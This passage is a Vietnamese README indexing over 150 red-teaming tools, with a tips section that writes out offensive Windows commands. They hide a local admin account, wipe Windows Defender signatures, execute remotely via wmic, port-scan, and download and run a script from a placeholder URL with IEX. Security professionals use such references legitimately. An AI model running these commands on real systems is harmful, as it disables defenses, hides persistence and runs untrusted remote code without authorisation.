# **RedTeam-Tools**
[![GitHub stars](https://img.shields.io/badge/stars-35054-blue?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020/stargazers)
[![GitHub forks](https://img.shields.io/badge/forks-0-blue?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020/network/members)
[![GitHub license](https://img.shields.io/github/license/Trongdepzai-dev/Hack-quiz2020)](https://github.com/Trongdepzai-dev/Hack-quiz2020/blob/main/LICENSE) 
[![Rating](https://img.shields.io/badge/rating-4.8%20stars-yellowgreen?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020)
[![Code Quality](https://img.shields.io/badge/code%20quality-A%2B-blue?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020)
[![Version](https://img.shields.io/badge/version-1.0.0-blue?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020/releases/tag/v1.0.0)
[![Activity Level](https://img.shields.io/badge/activity%20level-high-brightgreen?style=social)](https://github.com/Trongdepzai-dev/Hack-quiz2020)
<p align="center">
<img src="https://user-images.githubusercontent.com/100603074/210680426-20a92131-56f9-43ad-be82-f449e3215dda.png" height="300">
</p>

Kho lưu trữ Github này chứa một bộ sưu tập hơn **150+** **công cụ** và **nguồn tài nguyên** hữu ích cho các **hoạt động red teaming**.

Một số **công cụ** có thể được thiết kế riêng cho **red teaming**, trong khi những **công cụ** khác có tính chất tổng quát hơn và có thể được điều chỉnh để sử dụng cho **red teaming**.

> 🔗 Nếu bạn là Blue Teamer, hãy xem bài viết về [**BlueTeam-Tools**](https://github.com/Trongdepzai-dev/BlueTeam-Tools-VietNamese)

> **Cảnh báo**
> 
> *Đây là 1 bản port **Việt Hoá** và thêm 1 số **lưu ý** từ dự án [**BlueTeam-Tools**](https://github.com/A-poc/BlueTeam-Tools) và [**RedTeam-Tools**](https://github.com/A-poc/RedTeam-Tools)*
> 
> *Các tài liệu trong kho lưu trữ này chỉ dành cho mục đích thông tin và giáo dục. Chúng không nhằm mục đích sử dụng trong bất kỳ hoạt động bất hợp pháp nào.*

> **Ghi chú**
>
> *Ẩn các tiêu đề của **Danh sách công cụ** bằng mũi tên.*
>
> *Nhấn 🔙 để quay lại danh sách. Có thể 1 số cái không hoạt động như mong muốn* =))
>
> *Bài viết này sử dụng **MIT License***
>
> Xin chân thành cảm ơn những người đã đóng góp cho dự án này:
>
> @[Junior-Frontend-dev](https://github.com/Junior-Frontend-dev)

# **Danh sách công cụ**

<details open>
<summary>**Mẹo Red Team** 19 mẹo</summary>
    <ul>
        <ul>
        	<li>**<a href="#improved-html-smuggling-with-mouse-move-eventlistener">Cải tiến **HTML smuggling** bằng **EventListener** sự kiện di chuyển chuột</a>**<i> @pr0xylife</i></li>
        	<li>**<a href="#google-translate-for-phishing">Google translate cho **phishing**</a>**<i> @malmoeb</i></li>
            <li>**<a href="#hiding-the-local-admin-account">Ẩn tài khoản admin cục bộ</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#cripple-windows-defender-by-deleting-signatures">Làm tê liệt **Windows Defender** bằng cách xóa chữ ký</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#enable-multiple-rdp-sessions-per-user">Cho phép nhiều phiên **RDP** cho mỗi người dùng</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#sysinternals-psexecexe-local-alternative">Giải pháp thay thế cục bộ cho **Sysinternals PsExec.exe**</a>**<i> @GuhnooPlusLinux</i></li>
            <li>**<a href="#live-off-the-land-port-scanner">Máy quét cổng "**Live off the land**"</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#proxy-aware-powershell-downloadstring">PowerShell DownloadString có hỗ trợ proxy</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#looking-for-internal-endpoints-in-browser-bookmarks">Tìm kiếm các **endpoint nội bộ** trong dấu trang trình duyệt</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#query-dns-records-for-enumeration">Truy vấn bản ghi **DNS** để liệt kê</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#unquoted-service-paths-without-powerup">Tìm đường dẫn dịch vụ không có dấu ngoặc kép mà không cần **PowerUp**</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#bypass-a-disabled-command-prompt-with-k">Bypass dấu nhắc lệnh bị tắt với **/k**</a>**<i> Martin Sohn Christensen</i></li>
            <li>**<a href="#stop-windows-defender-deleting-mimikatzexe">Ngăn **Windows Defender** xóa **mimikatz.exe**</a>**<i> @GuhnooPlusLinux</i></li>
            <li>**<a href="#check-if-you-are-in-a-virtual-machine">Kiểm tra xem bạn có đang ở trong **máy ảo** không</a>**<i> @dmcxblue</i></li>
            <li>**<a href="#enumerate-applocker-rules">Liệt kê quy tắc **AppLocker**</a>**<i> @Alh4zr3d</i></li>
            <li>**<a href="#cmd-shortcut-with-6-pixels-via-mspaint">Lối tắt **CMD** với 6 pixel qua **mspaint**</a>**<i> PenTestPartners</i></li>
            <li>**<a href="#link-spoofing-with-preventdefault-javascript-method">Giả mạo liên kết với phương thức JavaScript **PreventDefault**</a>**<i> </i></li>
            <li>**<a href="#check-smb-firewall-rules-with-responder">Kiểm tra quy tắc **firewall SMB** với **Responder**</a>**<i> @malmoeb</i></li>
            <li>**<a href="#disable-av-with-sysinternals-pssuspend">Vô hiệu hóa AV với **SysInternals PsSuspend**</a>**<i> @0gtweet</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Reconnaissance** 24 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#spiderfoot">spiderfoot</a>**<i> Ánh xạ **OSINT** và bề mặt tấn công tự động</i></li>
            <li>**<a href="#reconftw">reconftw</a>**<i> Công cụ **recon** tên miền phụ và lỗ hổng tự động</i></li>
            <li>**<a href="#subzy">subzy</a>**<i> Trình kiểm tra lỗ hổng chiếm quyền điều khiển tên miền phụ</i></li>
            <li>**<a href="#smtp-user-enum">smtp-user-enum</a>**<i> Liệt kê người dùng **SMTP**</i></li>
            <li>**<a href="#crtsh---httprobe---eyewitness">crt.sh -> httprobe -> EyeWitness</a>**<i> Chụp ảnh màn hình tên miền tự động</i></li>
            <li>**<a href="#jsendpoints">jsendpoints</a>**<i> Trích xuất các liên kết **DOM** trang</i></li>
            <li>**<a href="#nuclei">nuclei</a>**<i> Trình quét lỗ hổng</i></li>
            <li>**<a href="#certsniff">certSniff</a>**<i> Bộ **sniff** từ khóa nhật ký minh bạch chứng chỉ</i></li>
            <li>**<a href="#gobuster">gobuster</a>**<i> **Brute force** đường dẫn trang web</i></li>
            <li>**<a href="#feroxbuster">feroxbuster</a>**<i> Công cụ khám phá nội dung nhanh được viết bằng Rust</i></li>
            <li>**<a href="#cloudbrute">CloudBrute</a>**<i> **Brute force** hạ tầng **cloud**</i></li>
            <li>**<a href="#dnsrecon">dnsrecon</a>**<i> Liệt kê bản ghi **DNS**</i></li>
            <li>**<a href="#shodanio">Shodan.io</a>**<i> Cơ sở kiến thức hệ thống hướng ra công cộng</i></li>
            <li>**<a href="#aort">AORT (All in One Recon Tool)</a>**<i> Liệt kê tên miền phụ</i></li>
            <li>**<a href="#spoofcheck">spoofcheck</a>**<i> Trình kiểm tra bản ghi **SPF/DMARC**</i></li>
            <li>**<a href="#awsbucketdump">AWSBucketDump</a>**<i> Liệt kê S3 bucket</i></li>
            <li>**<a href="#githarvester">GitHarvester</a>**<i> Công cụ tìm kiếm thông tin xác thực **GitHub**</i></li>
            <li>**<a href="#trufflehog">truffleHog</a>**<i> Trình quét thông tin xác thực **GitHub**</i></li>
            <li>**<a href="#dismap">Dismap</a>**<i> Khám phá/nhận dạng tài sản</i></li>
            <li>**<a href="#enum4linux">enum4linux</a>**<i> Liệt kê **Windows/samba**</i></li>
            <li>**<a href="#skanuvaty">skanuvaty</a>**<i> Trình quét **dns/network/port** cực nhanh và nguy hiểm</i></li>
            <li>**<a href="#metabigor">Metabigor</a>**<i> Công cụ **OSINT** không cần **API**</i></li>
            <li>**<a href="#gitrob">Gitrob</a>**<i> Trình quét thông tin nhạy cảm **GitHub**</i></li>
            <li>**<a href="#gowitness">gowitness</a>**<i> Tiện ích chụp ảnh màn hình web sử dụng **Chrome Headless**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Resource Development** 12 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#remoteinjector">remoteinjector</a>**<i> Tiêm liên kết mẫu từ xa vào tài liệu word</i></li>
            <li>**<a href="#chimera">Chimera</a>**<i> Che giấu **PowerShell**</i></li>
            <li>**<a href="#msfvenom">msfvenom</a>**<i> Tạo **payload**</i></li>
            <li>**<a href="#shellter">Shellter</a>**<i> Công cụ tiêm **shellcode** động</i></li>
            <li>**<a href="#freeze">Freeze</a>**<i> Tạo **payload** (**né tránh EDR**)</i></li>
            <li>**<a href="#wordsteal">WordSteal</a>**<i> Đánh cắp hash **NTML** với **Microsoft Word**</i></li>
            <li>**<a href="#ntapi-undocumented-functions">Hàm **NTAPI** chưa được tài liệu hóa</a>**<i> **Windows NT Kernel, Native API** và **drivers**</i></li>
            <li>**<a href="#kernel-callback-functions">Hàm **Kernel Callback Functions**</a>**<i> Các **API Windows** chưa được tài liệu hóa</i></li>
            <li>**<a href="#offensivevba">OffensiveVBA</a>**<i> Kỹ thuật thực thi mã **Office macro** và né tránh</i></li>
            <li>**<a href="#wsh">WSH</a>**<i> **Payload Wsh**</i></li>
            <li>**<a href="#hta">HTA</a>**<i> **Payload Hta**</i></li>
            <li>**<a href="#vba">VBA</a>**<i> **Payload Vba**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Initial Access** 10 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#credmaster">CredMaster</a>**<i> Công cụ **password spraying** **CredKing**</i></li>
            <li>**<a href="#trevorspray">TREVORspray</a>**<i> Trình phun mật khẩu có hỗ trợ luồng (**threading**)</i></li>
            <li>**<a href="#evilqr">evilqr</a>**<i> **PoC phishing QRLJacking**</i></li>
            <li>**<a href="#cupp">CUPP</a>**<i> Công cụ tạo profile mật khẩu người dùng phổ biến (**Common User Passwords Profiler - CUPP**)</i></li>
            <li>**<a href="#bash-bunny">Bash Bunny</a>**<i> Công cụ tấn công **USB**</i></li>
            <li>**<a href="#evilgophish">EvilGoPhish</a>**<i> **Framework** chiến dịch **phishing**</i></li>
            <li>**<a href="#social-engineer-toolkit-set">The Social-Engineer Toolkit</a>**<i> **Framework** chiến dịch **phishing**</i></li>
            <li>**<a href="#hydra">Hydra</a>**<i> Công cụ **brute force**</i></li>
            <li>**<a href="#squarephish">SquarePhish</a>**<i> **Framework phishing OAuth/QR code**</i></li>
            <li>**<a href="#king-phisher">King Phisher</a>**<i> **Framework** chiến dịch **phishing**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Execution** 13 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#responder">Responder</a>**<i> **LLMNR, NBT-NS** và trình độc **MDNS**</i></li>
            <li>**<a href="#secretsdump">secretsdump</a>**<i> Trình **dump** hash từ xa</i></li>
            <li>**<a href="#evil-winrm">evil-winrm</a>**<i> Shell **WinRM**</i></li>
            <li>**<a href="#donut">Donut</a>**<i> Thực thi .NET trong bộ nhớ</i></li>
            <li>**<a href="#macro_pack">Macro_pack</a>**<i> Che giấu Macro</i></li>
            <li>**<a href="#powersploit">PowerSploit</a>**<i> Bộ script **PowerShell**</i></li>
            <li>**<a href="#rubeus">Rubeus</a>**<i> Công cụ tấn công **Active Directory**</i></li>
            <li>**<a href="#sharpup">SharpUp</a>**<i> Trình nhận dạng lỗ hổng **Windows**</i></li>
            <li>**<a href="#sqlrecon">SQLRecon</a>**<i> **Toolkit MS-SQL** tấn công</i></li>
            <li>**<a href="#ultimateapplockerbypasslist">UltimateAppLockerByPassList</a>**<i> Kỹ thuật **Bypass AppLocker** phổ biến</i></li>
            <li>**<a href="#starfighters">StarFighters</a>**<i> Trình khởi chạy **Empire** dựa trên **JavaScript** và **VBScript**</i></li>
            <li>**<a href="#demiguise">demiguise</a>**<i> Công cụ mã hóa **HTA**</i></li>
            <li>**<a href="#powerzure">PowerZure</a>**<i> **Framework PowerShell** để đánh giá bảo mật **Azure**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Persistence** 4 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#impacket">Impacket</a>**<i> Bộ script **Python**</i></li>
            <li>**<a href="#empire">Empire</a>**<i> **Framework** hậu khai thác (**post-exploitation**)</i></li>
            <li>**<a href="#sharpersist">SharPersist</a>**<i> Toolkit duy trì truy cập **Windows**</i></li>
            <li>**<a href="#ligolo-ng">ligolo-ng</a>**<i> Công cụ tạo tunnel sử dụng giao diện TUN</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Privilege Escalation** 11 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#crassus">Crassus</a>**<i> Công cụ khám phá nâng quyền cục bộ **Windows**</i></li>
            <li>**<a href="#linpeas">LinPEAS</a>**<i> Nâng quyền cục bộ **Linux**</i></li>
            <li>**<a href="#winpeas">WinPEAS</a>**<i> Nâng quyền cục bộ **Windows**</i></li>
            <li>**<a href="#linux-smart-enumeration">linux-smart-enumeration</a>**<i> Nâng quyền cục bộ **Linux**</i></li>
            <li>**<a href="#certify">Certify</a>**<i> Nâng quyền cục bộ **Active Directory**</i></li>
            <li>**<a href="#get-gpppassword">Get-GPPPassword</a>**<i> Trích xuất mật khẩu **Windows**</i></li>
            <li>**<a href="#sherlock">Sherlock</a>**<i> Công cụ nâng quyền cục bộ **PowerShell**</i></li>
            <li>**<a href="#watson">Watson</a>**<i> Công cụ nâng quyền cục bộ **Windows**</i></li>
            <li>**<a href="#impulsivedllhijack">ImpulsiveDLLHijack</a>**<i> Công cụ **DLL Hijack**</i></li>
            <li>**<a href="#adfsdump">ADFSDump</a>**<i> Công cụ **dump AD FS**</i></li>
            <li>**<a href="#beroot">BeRoot</a>**<i> Dự án nâng quyền cục bộ trên nhiều **HĐH**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Defense Evasion** 8 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#invoke-obfuscation">Invoke-Obfuscation</a>**<i> Công cụ che giấu script</i></li>
            <li>**<a href="#veil">Veil</a>**<i> Công cụ che giấu **Metasploit payload**</i></li>
            <li>**<a href="#sharpblock">SharpBlock</a>**<i> **Bypass EDR** thông qua ngăn chặn thực thi điểm vào</i></li>
            <li>**<a href="#alcatraz">Alcatraz</a>**<i> Trình che giấu nhị phân x64 có **GUI**</i></li>
            <li>**<a href="#mangle">Mangle</a>**<i> Thao tác với các tệp thực thi đã biên dịch</i></li>
            <li>**<a href="#amsi-fail">AMSI Fail</a>**<i> Các đoạn code **PowerShell** làm hỏng hoặc vô hiệu hóa **AMSI**</i></li>
            <li>**<a href="#scarecrow">ScareCrow</a>**<i> **Framework** tạo **payload** được thiết kế để **bypass EDR**</i></li>
            <li>**<a href="#moonwalk">moonwalk</a>**<i> Công cụ xóa dấu thời gian nhật ký hệ thống và hệ thống tệp **Linux**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Credential Access** 11 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#mimikatz">Mimikatz</a>**<i> Trình trích xuất thông tin xác thực **Windows**</i></li>
            <li>**<a href="#lazagne">LaZagne</a>**<i> Trình trích xuất mật khẩu cục bộ</i></li>
            <li>**<a href="#hashcat">hashcat</a>**<i> Cracking **password hash**</i></li>
            <li>**<a href="#john-the-ripper">John the Ripper</a>**<i> Cracking **password hash**</i></li>
            <li>**<a href="#scomdecrypt">SCOMDecrypt</a>**<i> Công cụ giải mã thông tin xác thực **SCOM**</i></li>
            <li>**<a href="#nanodump">nanodump</a>**<i> Tạo **minidump** tiến trình **LSASS**</i></li>
            <li>**<a href="#eviltree">eviltree</a>**<i> Bản dựng lại lệnh **Tree** để khám phá thông tin xác thực</i></li>
            <li>**<a href="#seeyoucm-thief">SeeYouCM-Thief</a>**<i> Phân tích cú pháp tệp cấu hình hệ thống điện thoại **Cisco**</i></li>
            <li>**<a href="#mailsniper">MailSniper</a>**<i> Trình tìm kiếm thư **Microsoft Exchange**</i></li>
            <li>**<a href="#sharpchromium">SharpChromium</a>**<i> Trình trích xuất **Cookie, history** và thông tin đăng nhập đã lưu của **Chromium**</i></li>
            <li>**<a href="#dploot">dploot</a>**<i> Loooter **DPAPI** từ xa bằng **Python**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Discovery** 6 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#pcredz">PCredz</a>**<i> Khám phá thông tin xác thực trên file **PCAP/live interface**</i></li>
            <li>**<a href="#pingcastle">PingCastle</a>**<i> Trình đánh giá **Active Directory**</i></li>
            <li>**<a href="#seatbelt">Seatbelt</a>**<i> Trình quét lỗ hổng cục bộ</i></li>
            <li>**<a href="#adrecon">ADRecon</a>**<i> **Reconnaissance Active Directory**</i></li>
            <li>**<a href="#adidnsdump">adidnsdump</a>**<i> **Dumping DNS** tích hợp **Active Directory**</i></li>
            <li>**<a href="#scavenger">scavenger</a>**<i> Công cụ quét để tìm kiếm (**scavenging**) các hệ thống</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Lateral Movement** 12 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#crackmapexec">crackmapexec</a>**<i> Toolkit di chuyển ngang trên **Windows/Active Directory**</i></li>
            <li>**<a href="#wmiops">WMIOps</a>**<i> Lệnh **WMI** từ xa</i></li>
            <li>**<a href="#powerlessshell">PowerLessShell</a>**<i> **PowerShell** từ xa mà không cần **PowerShell.exe**</i></li>
            <li>**<a href="#psexec">PsExec</a>**<i> Công cụ thay thế telnet gọn nhẹ</i></li>
            <li>**<a href="#liquidsnake">LiquidSnake</a>**<i> Di chuyển ngang không ghi vào đĩa</i></li>
            <li>**<a href="#enabling-rdp">Bật **RDP**</a>**<i> Lệnh bật **RDP Windows**</i></li>
            <li>**<a href="#upgrading-shell-to-meterpreter">Nâng cấp shell lên **meterpreter**</a>**<i> Cải tiến reverse shell</i></li>
            <li>**<a href="#forwarding-ports">Chuyển tiếp cổng</a>**<i> Lệnh chuyển tiếp cổng cục bộ</i></li>
            <li>**<a href="#jenkins-reverse-shell">Reverse shell Jenkins</a>**<i> Lệnh shell **Jenkins**</i></li>
            <li>**<a href="#adfspoof">ADFSpoof</a>**<i> Tạo giả **token** bảo mật **AD FS**</i></li>
            <li>**<a href="#kerbrute">kerbrute</a>**<i> Công cụ thực hiện **Kerberos pre-auth bruteforcing**</i></li>
            <li>**<a href="#coercer">Coercer</a>**<i> Buộc máy chủ **Windows** xác thực</i></li>
            <li>**<a href="#wmiops">WMIOps</a>**<i> Lệnh **WMI** từ xa</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Collection** 3 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#bloodhound">BloodHound</a>**<i> Trực quan hóa **Active Directory**</i></li>
            <li>**<a href="#snaffler">Snaffler</a>**<i> Thu thập thông tin xác thực **Active Directory**</i></li>
            <li>**<a href="#linwinpwn">linWinPwn</a>**<i> Kiểm tra liệt kê và lỗ hổng **Active Directory**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Command and Control** 9 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#living-off-trusted-sites-project">Dự án "**Living Off Trusted Sites Project**"</a>**<i> Tận dụng các tên miền hợp pháp cho **C2** của bạn</i></li>
            <li>**<a href="#havoc">Havoc</a>**<i> **Framework Command and control**</i></li>
            <li>**<a href="#covenant">Covenant</a>**<i> **Framework Command and control** (.NET)</i></li>
            <li>**<a href="#merlin">Merlin</a>**<i> **Framework Command and control** (Golang)</i></li>
            <li>**<a href="#metasploit-framework">Metasploit Framework</a>**<i> **Framework Command and control** (Ruby)</i></li>
            <li>**<a href="#pupy">Pupy</a>**<i> **Framework Command and control** (Python)</i></li>
            <li>**<a href="#brute-ratel">Brute Ratel</a>**<i> **Framework Command and control** ($$$)</i></li>
            <li>**<a href="#nimplant">NimPlant</a>**<i> **Implant C2** được viết bằng Nim</i></li>
            <li>**<a href="#hoaxshell">Hoaxshell</a>**<i> **PowerShell reverse shell**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Exfiltration** 5 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#dnscat2">Dnscat2</a>**<i> C2 qua **DNS tunneling**</i></li>
            <li>**<a href="#cloakify">Cloakify</a>**<i> Chuyển đổi dữ liệu để **exfiltration**</i></li>
            <li>**<a href="#pyexfil">PyExfil</a>**<i> **PoC Data exfiltration**</i></li>
            <li>**<a href="#powershell-rat">Powershell RAT</a>**<i> **Backdoor** dựa trên **Python**</i></li>
            <li>**<a href="#gd-thief">GD-Thief</a>**<i> **Exfiltration Google Drive**</i></li>
        </ul>
    </ul>
</details>

<details open>
<summary>**Impact** 4 công cụ</summary>
    <ul>
        <ul>
            <li>**<a href="#conti-pentester-guide-leak">Rò rỉ hướng dẫn pentester của **Conti**</a>**<i> Toolkit của các chi nhánh nhóm **ransomware Conti**</i></li>
            <li>**<a href="#slowloris">SlowLoris</a>**<i> Từ chối dịch vụ đơn giản (**Simple denial of service**)</i></li>
            <li>**<a href="#usbkill">usbkill</a>**<i> **Kill-switch chống pháp y**</i></li>
            <li>**<a href="#keytap">Keytap</a>**<i> Lấy các phím bàn phím đã nhấn từ âm thanh gõ phím</i></li>
        </ul>
    </ul>
</details>

**Mẹo Red Team**
====================

*Học hỏi từ các **Red Teamer** với bộ sưu tập Mẹo **Red Teaming**. Những mẹo này bao gồm nhiều chiến thuật, **công cụ** và phương pháp luận để cải thiện khả năng **red teaming** của bạn.*

### [🔙](#tool-list)**Cải tiến HTML smuggling** bằng **EventListener** sự kiện di chuyển chuột

**Mô tả:** *'**Qakbot** đã thêm một **EventListener** cho chuyển động chuột vào tệp đính kèm **HTML smuggling** để chống **evasion** trong **sandbox**, khiến tệp zip không được thả ra.'*

**Đóng góp:** [@pr0xylife](https://x.com/pr0xylife)

**Liên kết:** [Twitter](https://x.com/pr0xylife/status/1598410732516802563)

### [🔙](#tool-list)Google translate cho **phishing**

**Mô tả:** *Đánh cắp thông tin xác thực trang web **phishing** thành công thông qua chức năng xem trang của **Google Translate**.*

**Đóng góp:** [@malmoeb](https://x.com/malmoeb)

**Liên kết:** [Twitter](https://x.com/malmoeb/status/1671106885590630400)

### [🔙](#tool-list)Ẩn tài khoản admin cục bộ

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v alh4zr3d /d 0 /f
```
**Lưu ý:** Lệnh này được thực thi trên **Windows CMD/PowerShell** và cần quyền **quản trị**. Nó thêm một giá trị vào registry để ẩn một tài khoản cục bộ khỏi màn hình đăng nhập. Kỹ thuật này thường dùng để duy trì truy cập một cách lén lút.

**Mô tả:** *'Tạo tài khoản rất rủi ro khi né tránh đội xanh (**blue team**), nhưng khi tạo admin cục bộ, hãy dùng một số mánh khóe trong registry để ẩn nó.'*

**Đóng góp:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**Liên kết:** [Twitter](https://twitter.com/Alh4zr3d/status/1612913838999113728)

### [🔙](#tool-list)Làm tê liệt **Windows Defender** bằng cách xóa chữ ký

```bash
"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
**Lưu ý:** Lệnh này chạy file thực thi của **Windows Defender** và ra lệnh xóa tất cả chữ ký virus. Điều này có thể vô hiệu hóa khả năng phát hiện phần mềm độc hại của **Defender**. Nó cần quyền **quản trị** và có thể bị **EDR** hoặc chính **Defender** cảnh báo hoặc chặn.

**Mô tả:** *'Hơi lộn xộn một chút, nhưng nếu **Windows Defender** đang gây đau đầu cho bạn, thay vì vô hiệu hóa nó (điều sẽ báo động cho người dùng), bạn chỉ cần vô hiệu hóa nó bằng cách xóa tất cả chữ ký.'*

**Đóng góp:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**Liên kết:** [Twitter](https://twitter.com/Alh4zr3d/status/1611005101262389250)

### [🔙](#tool-list)Cho phép nhiều phiên **RDP** cho mỗi người dùng

```bash
reg add HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0 /f
```
**Lưu ý:** Lệnh này sửa đổi **Windows Registry** để cho phép nhiều người dùng cùng đăng nhập vào hệ thống thông qua **RDP**, hoặc cho phép một người dùng có nhiều phiên **RDP** đồng thời. Yêu cầu quyền **quản trị**.

**Mô tả:** *'Đôi khi bạn muốn đăng nhập vào một máy chủ qua **RDP** hoặc tương tự, nhưng người dùng của bạn đã có một phiên hoạt động. Hãy bật nhiều phiên cho mỗi người dùng.'*

**Đóng góp:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**Liên kết:** [Twitter](https://twitter.com/Alh4zr3d/status/1609954528425558016)

### [🔙](#tool-list)Giải pháp thay thế cục bộ cho **Sysinternals PsExec.exe**

```bash
wmic.exe /node:10.1.1.1 /user:username /password:pass process call create cmd.exe /c " command "
```
**Lưu ý:** Lệnh này sử dụng tiện ích **WMIC** (Windows Management Instrumentation Command-line) để tạo một tiến trình (thực thi một lệnh) trên máy tính từ xa. Đây là một phương pháp "live off the land" để thực thi từ xa trên **Windows** mà không cần tải xuống **PsExec.exe**. Yêu cầu thông tin xác thực quản trị viên trên máy từ xa và các kết nối **WMI/DCOM** không bị chặn bởi firewall.

**Mô tả:** *'Bạn có chán ngán việc tải lên **Sysinternals PsExec.exe** khi thực hiện di chuyển ngang không? **Windows** có một giải pháp thay thế tốt hơn được cài đặt sẵn. Hãy thử cái này.'*

**Đóng góp:** [@GuhnooPlusLinux](https://twitter.com/GuhnooPlusLinux)

**Liên kết:** [Twitter](https://twitter.com/GuhnooPlusLinux/status/1607473627922063360)

### [🔙](#tool-list)Máy quét cổng "**Live off the land**"

```bash
0..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect(<tgt_ip>,$_)) "Port $_ open"} 2>$null
```
**Lưu ý:** Đoạn mã này sử dụng **PowerShell** để thử kết nối tới tất cả các cổng (từ 0 đến 65535) trên một địa chỉ IP mục tiêu cụ thể (`<tgt_ip>`). Nếu kết nối thành công, nó sẽ in thông báo "Port <số cổng> open". Đây là một cách đơn giản để quét cổng chỉ bằng các **lệnh có sẵn trong Windows**, tránh tải xuống các công cụ quét chuyên dụng.

**Mô tả:** *'Khi có thể, hãy "**live off the land**" thay vì tải **công cụ** lên máy (vì nhiều lý do). **PowerShell/.NET** giúp ích. Ví dụ: **máy quét cổng** đơn giản trong **Powershell**.'*

**Đóng góp:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**Liên kết:** [Twitter](https://twitter.com/Alh4zr3d/status/1605060950339588096)

### [🔙](#tool-list)PowerShell DownloadString có hỗ trợ proxy

```bash
$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("<url>")
```
**Lưu ý:** Đoạn mã này sử dụng lớp `Net.WebClient` trong **PowerShell** để tải xuống một chuỗi (thường là một **script** hoặc **payload**) từ một **URL** (`<url>`). Đặc điểm quan trọng là nó thiết lập thông tin xác thực proxy mặc định của mạng (`[Net.CredentialCache]::DefaultNetworkCredentials`), cho phép hoạt động tải xuống thành công ngay cả trong các môi trường có yêu cầu xác thực proxy. `IEX` là bí danh cho `Invoke-Expression`, được sử dụng để thực thi chuỗi đã tải xuống.

**Mô tả:** *'Hầu hết các tổ chức lớn đều sử dụng **proxy web** hiện nay. Hàm **DownloadString PowerShell** tiêu chuẩn không hỗ trợ **proxy**. Hãy sử dụng cái này.'*

**Đóng góp:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**Liên kết:** [Twitter](https://twitter.com/Alh4zr3d/status/1596192664398966785)

### [🔙](#tool-list)Tìm kiếm các **endpoint nội bộ** trong dấu trang trình duyệt

```bash
type "C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks.bak" | findstr /c "name url" | findstr /v "type"
```
**Lưu ý:** Lệnh này sử dụng các tiện ích dòng lệnh của **Windows** (`type` và `findstr`) để đọc nội dung tệp sao lưu dấu trang của Google Chrome và tìm kiếm các dòng chứa cả "name" và "url", sau đó loại bỏ các dòng chứa "type". Nó nhằm mục đích lọc ra tên và **URL** của các dấu trang để tìm kiếm các tài nguyên nội bộ mà người dùng đã lưu. Tệp dấu trang có thể có vị trí hơi khác tùy phiên bản Chrome và **HĐH**.

**Mô tả:** *'Bạn sẽ ngạc nhiên với những gì bạn có thể tìm thấy chỉ từ dấu trang của người dùng. Các **endpoint nội bộ** mà họ có thể truy cập, chẳng hạn.'*

**Đóng góp:** [@Alh4zr3d](https://twitter.com/Alh4zr3d)

**Liên kết:** [Twitter](https://twitter.com/Alh4zr3d/status/1595488676389171200)

### [🔙](#tool-list)Truy vấn bản ghi **DNS** để liệt kê

```bash
Get-DnsRecord -RecordType A -ZoneName FQDN -Server <server hostname>
```
**Lưu ý:** Lệnh này sử dụng **PowerShell** để truy vấn máy chủ **DNS** cụ thể (`<server hostname>`) để lấy các bản ghi loại **A** (ánh xạ tên máy chủ thành địa chỉ IPv4) trong một vùng **DNS** được chỉ định (`ZoneName`). Kỹ thuật này có thể được sử dụng để liệt kê các máy chủ và dịch vụ trong một **domain** nếu bạn có quyền truy vấn máy chủ **DNS**. Thường hoạt động tốt nhất nếu bạn có quyền xác thực với máy chủ **DNS**, hoặc nếu máy chủ cho phép truy vấn không xác thực (thường là sai cấu hình bảo mật).

